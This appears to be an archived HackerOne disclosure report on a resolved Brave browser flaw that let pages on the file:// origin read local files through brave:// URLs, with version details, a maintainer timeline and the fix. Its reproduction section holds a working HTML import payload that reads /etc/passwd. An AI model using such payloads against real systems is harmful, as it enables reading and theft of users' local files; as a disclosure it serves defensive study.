---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/xss
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2018-09-29
submitted: 2018-08-03T23:06:57.182Z
bounty_usd: null
votes: 24
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "metnew"
source: "https://hackerone.com/reports/390362"
title: "Local files reading from the 'file://' origin through `brave://`"
---
# Local files reading from the "file://" origin through `brave://`

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 24 | **Program:** Brave Software | **Disclosed:** 2018-09-29

- Report: [https://hackerone.com/reports/390362](https://hackerone.com/reports/390362)
- CWE: N/A
- Submitted: 2018-08-03T23:06:57.182Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Sadly, fix for #390013 works only for web. Loading `brave://` from the `file://` origin allows reading local files on the device.

> I said that fix could be insufficient 😈

`file://` and `brave://` both are local origins. That means it's possible to access `brave://` from `file://` and vice versa.

## Products affected: 

Brave: 0.23.77 
V8: 6.8.275.24 
rev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149 
Muon: 8.0.6 
OS Release: 17.7.0 
Update Channel: Релиз 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.84

## Steps To Reproduce:

```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```
## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading should be denied.

## Timeline

- **2018-08-03** @metnew: Brave's repo mentions the #390013 problem. 
I'm going to contact security@brave.com directly to resolve this issue more quickly.
- **2018-08-03** @metnew: > Sent @diracdeltas more info about this bug.
- **2018-08-04** @diracdeltas: thanks, noting that i've seen this. as i understand it, it's basically the same impact as 375329
- **2018-08-04** @metnew: Yeah, the same problem
- **Report Filed**
- **2018-08-08** @metnew: Fix: https://github.com/brave/muon/commit/df6ee1e7acff52b9e4317551be51bd0d2bd6463e

> removes CORS header from a response of `AsarProtocolHandler`
- **2018-08-08** @diracdeltas: this PR should fix it once merged https://github.com/brave/muon/pull/641
- **Bounty Awarded**
- **Report Resolved**
- **2018-08-08** @metnew: Great, thanks @brave for the bounty and quick fix
- **2018-09-21** @metnew: @diracdeltas Unpatched at that time #369218 (opening `file:///` URLs from the web using "open in new tab") allowed to significantly increase severity of this bug.
- **Agreed On Going Public**
- **2018-09-28** @diracdeltas: https://hackerone.com/reports/375329#activity-3402965 also applies here, except instead of simply opening a file, the user has to open it via `brave://` for the attack to work (by default clicking on a file opens it via `file://`). This attack seems more convoluted because the attacker probably has to get the user to open a special link (via phishing for instance) to get them to load it with `brave://`.
- **Bounty Awarded**
- **2018-09-28** @metnew: Actually, no, the file should be opened on file:// origin. @diracdeltas 
Additionally, navigation to brave:// leads to crash
- **2018-09-28** @diracdeltas: @metnew oops, i misread. `brave://` is the imported resource not the top-level.
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
